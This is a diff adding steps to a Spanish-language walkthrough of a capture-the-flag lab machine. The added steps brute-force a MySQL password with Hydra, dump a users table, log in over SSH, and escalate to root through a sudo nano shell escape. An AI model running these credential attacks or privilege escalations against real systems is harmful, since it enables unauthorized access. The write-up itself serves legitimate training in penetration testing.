@@ -48,6 +48,8 @@ Revisando el código fuente me encuentro un detalle que me resulta la atención 
 
 <figure><img src="../../.gitbook/assets/image (948).png" alt=""><figcaption></figcaption></figure>
 
+### 🚀 **EXPLOTACIÓN**
+
 Con la información obtenida anteriormente, realizamos el comando:
 
 ```bash
@@ -69,3 +71,59 @@ cat diccionario | sed 's/ //g' > rockyou
 
 Realizamos el ataque de fuerza bruta con **Hydra** con ese diccionario creado.
 
+```
+hydra -l V -P rockyou mysql://172.17.0.2 -f
+```
+
+Obtenemos que la contraseña es **pie168**. Hacemos conexión a la MySQL.
+
+```bash
+mysql -h 172.17.0.2 -u V -pie168 --skip-ssl
+```
+
+Miramos si hay algún usuario con sus credenciales.
+
+```bash
+show databases;
+use BTN;
+show tables;
+select * from users;
+```
+
+<figure><img src="../../.gitbook/assets/image (949).png" alt=""><figcaption></figcaption></figure>
+
+Hemos conseguido las credenciales de **Vendetta** y nos logueamos al servicio **SSH**.
+
+```bash
+ssh Vendetta@172.17.0.2
+```
+
+<figure><img src="../../.gitbook/assets/image (950).png" alt=""><figcaption></figcaption></figure>
+
+### 🔐 **PRIVILEGIOS**
+
+Al estar dentro y ejecutar:
+
+```bash
+whoami
+```
+
+aún no somos **root**, por lo que hacemos:
+
+```bash
+sudo -l
+```
+
+para ver si hay algo para explotar.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (951).png" alt=""><figcaption></figcaption></figure>
+
+Nos llama la atención **nano** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/nano/#sudo)cómo explotarlo.
+
+```bash
+sudo /usr/bin/nano
+Ctrl+R seguida de Ctrl+X
+reset; sh 1>&0 2>&0
+```
+
+<figure><img src="../../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>
